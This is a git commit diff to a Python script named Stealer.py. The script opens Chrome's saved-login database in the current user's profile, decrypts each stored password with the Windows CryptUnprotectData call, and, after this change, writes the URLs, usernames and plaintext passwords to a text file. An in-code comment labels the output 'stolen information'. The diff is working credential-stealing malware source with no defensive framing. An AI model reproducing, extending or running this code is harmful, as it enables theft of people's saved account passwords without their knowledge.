36aa0e0d6962c68df714a7ef2c3b49e0fa0acafc
idk <91932176+SyfonSec@users.noreply.github.com>
2023-04-02 21:50:40 -0700

    Update Stealer.py

--- Stealer.py
+++ Stealer.py
@@ -5,16 +5,19 @@ import win32crypt
 data_path = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
 login_db = os.path.join(data_path, 'Login Data')
 
-# connecting to the database
-c = sqlite3.connect(login_db)
-cursor = c.cursor()
+# open file to write information
+with open('chrome-information.txt', 'w') as f:
+    # connecting to the database
+    c = sqlite3.connect(login_db)
+    cursor = c.cursor()
 
-# fetching saved login credentials
-cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-for result in cursor.fetchall():
-    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
-    print("URL: ", result[0], "\nUsername: ", result[1], "\nPassword: ", password, "\n")
+    # fetching saved login credentials
+    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+    for result in cursor.fetchall():
+        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
+        #Writes the stolen information the the text file
+        f.write(f"URL: {result[0]}\nUsername: {result[1]}\nPassword: {password}\n\n")
 
-# closing the database connection
-cursor.close()
-c.close()
+    # closing the database connection
+    cursor.close()
+    c.close()
